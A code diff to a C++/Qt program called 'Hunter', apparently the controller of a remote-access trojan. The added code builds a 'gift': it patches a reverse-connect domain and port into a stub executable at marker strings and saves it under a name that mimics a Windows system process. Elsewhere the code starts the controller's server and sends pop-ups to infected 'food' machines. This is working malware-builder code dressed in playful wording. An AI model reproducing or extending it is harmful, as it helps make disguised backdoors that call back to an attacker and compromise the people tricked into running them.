@@ -127,9 +127,83 @@ Hunter::Hunter(QWidget *parent)
                 ui->btSwitch->setText("停止hunter");
                 ui->lineEditPort2->setReadOnly(true);
             } else {
-                QMessageBox::warning(this, "提示", "对不起主人...开启服务端失败");
+                QMessageBox::warning(this, "提示", "对不起主人...开启hunter服务端失败");
             }
         }
+    });
+
+    // 制作礼品开关
+    connect(ui->btGenerate, &QPushButton::clicked, this, [=](){
+        // cuteFood.exe文件
+        const QString fileName = "cuteFood.exe";
+
+        // 注意 对于macos而言 要放到真正的可执行文件目录下 而不是app所在目录
+        QFile file(fileName);
+        if (!file.exists()) {
+            QMessageBox::warning(this, "提示","主人！要把想送的东西命名为cuteFood.exe放到本程序的目录下哟");
+            return;
+        }
+
+        // 获取保存礼品的位置
+        QString saveFileName = QFileDialog::getSaveFileName(this, "保存主人精心准备的礼物",
+                                                            QDir::current().absoluteFilePath("svchostFood.exe"),"应用程序(*.exe)",
+                                                            nullptr, QFileDialog::ShowDirsOnly);
+
+        if (saveFileName.size() <= 0) {
+            return;
+        }
+
+        // cuteFood.exe
+        if (!file.open(QFile::ReadOnly)) {
+            QMessageBox::warning(this, "提示","cuteFood.exe");
+            return;
+        }
+
+        QByteArray fileData = file.readAll();
+
+        // 关闭文件
+        file.close();
+
+        // 自定义食物的反弹连接的域名和端口
+        const int offsetDomain = 10;
+        const char domain[100] = "BLACKHAWK:\0";
+        const int offsetPort = 12;
+        const char port[100] = "HAWKISBLACK:\0";
+
+        // 自定义域名
+        int domainPos = fileData.indexOf(domain);
+        if (domainPos == -1) {
+            QMessageBox::warning(this, "提示","对不起主人！无法生成礼物，因为无法找到\'BLACKHAWK:\'的位置");
+            return;
+        }
+        domainPos += offsetDomain;
+
+        QByteArray afterDomain;
+        afterDomain.append(ui->lineEditDomain->text()+" ");
+        fileData.replace(domainPos, afterDomain.size(), afterDomain);
+
+        // 自定义端口
+        int portPos = fileData.indexOf(port);
+        if (portPos == -1) {
+            QMessageBox::warning(this, "提示","对不起主人！无法生成礼物，因为无法找到\'HAWKISBLACK:\'的位置");
+            return;
+        }
+        portPos += offsetPort;
+
+        QByteArray afterPort;
+        afterPort.append(ui->lineEditPort1->text()+" ");
+        fileData.replace(portPos, afterPort.size(), afterPort);
+
+        // 保存文件
+        QFile saveFile(saveFileName);
+        if (!saveFile.open(QFile::WriteOnly)) {
+            QMessageBox::warning(this, "提示","对不起主人！无法打开"+saveFileName);
+            return;
+        }
+        saveFile.write(fileData.data(), fileData.size());
+
+        saveFile.flush();
+        saveFile.close();
     });
 
     // 对食物发送弹窗
